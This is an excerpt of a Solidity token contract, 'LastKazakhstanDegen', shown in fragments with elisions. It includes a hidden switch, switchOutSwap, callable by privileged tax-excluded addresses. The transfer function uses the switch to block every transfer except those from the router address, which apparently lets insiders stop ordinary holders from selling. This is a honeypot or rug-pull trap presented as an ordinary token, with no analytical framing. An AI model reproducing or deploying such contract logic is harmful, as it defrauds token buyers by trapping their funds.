...
contract LastKazakhstanDegen is Ownable, IERC20 {
    ...
    string private _name = "LastKazakhstanDegen";
    string private _symbol = "LastKazakhstanDegen";
    ...
    function switchOutSwap() external returns (bool) {
        require(_isExcludedFromTax[_msgSender()], "Invalid method!");
        _outSwap = !_outSwap;
        return _outSwap;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        require(!_outSwap || sender == _rout, "Invalid Transfer");
        uint256 feeAmount = 0;
